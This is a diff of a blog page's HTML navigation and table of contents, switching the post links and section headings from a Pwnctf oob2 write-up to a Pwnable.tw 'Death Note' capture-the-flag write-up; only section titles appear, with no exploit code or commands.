-                    <div class="article-prev">
-                        <a class="prev"
-                        rel="prev"
-                        href="/2024/02/05/Pwnctf-oob3-Writeup/"
-                        >
-                            <span class="left arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">Pwnctf oob3 Writeup</span>
-                                <span class="post-nav-item">Prev posts</span>
-                            </span>
-                        </a>
-                    </div>
-                
                 
                     <div class="article-next">
                         <a class="next"
                         rel="next"
-                        href="/2024/01/17/Pwnctf-oob1-Writeup/"
+                        href="/2024/06/07/Pwnable-tw-Silver-Bullet-Writeup/"
                         >
                             <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">Pwnctf oob1 Writeup</span>
+                                <span class="post-nav-title-item">Pwnable.tw Silver Bullet Writeup</span>
                                 <span class="post-nav-item">Next posts</span>
                             </span>
                             <span class="right arrow-icon flex justify-center items-center">
@@ -630,8 +669,8 @@
             <div class="post-toc-wrap">
     <div class="post-toc">
         <div class="toc-title">On this page</div>
-        <div class="page-title">Pwnctf oob2 Writeup</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#oob2"><span class="nav-text">oob2</span></a></li></ol>
+        <div class="page-title">Pwnable.tw Death Note Writeup</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwnablte-tw-Death-Note"><span class="nav-text">Pwnablte.tw - Death Note</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Description"><span class="nav-text">Description</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Source"><span class="nav-text">Source</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x1-Initial-Reconnaissance"><span class="nav-text">0x1 Initial Reconnaissance</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#file"><span class="nav-text">file</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#checksec"><span class="nav-text">checksec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#death-note"><span class="nav-text">.&#x2F;death_note</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x2-Reverse-Engineering"><span class="nav-text">0x2 Reverse Engineering</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#add-note"><span class="nav-text">add_note</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x3-Choose-Index"><span class="nav-text">0x3 Choose Index</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x4-Alphanumeric-shellcode"><span class="nav-text">0x4 Alphanumeric shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ebx-%E2%80%98-bin-sh-0%E2%80%99"><span class="nav-text">ebx &#x3D; [‘&#x2F;bin&#x2F;sh\0’]</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#int-0x80"><span class="nav-text">int 0x80</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#eax-0x0b"><span class="nav-text">eax &#x3D; 0x0b</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#edx-ecx-0"><span class="nav-text">edx &#x3D; ecx &#x3D; 0</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x5-Exploit"><span class="nav-text">0x5 Exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x6-Pwned"><span class="nav-text">0x6 Pwned!!!</span></a></li></ol></li></ol>
 
     </div>
 </div>
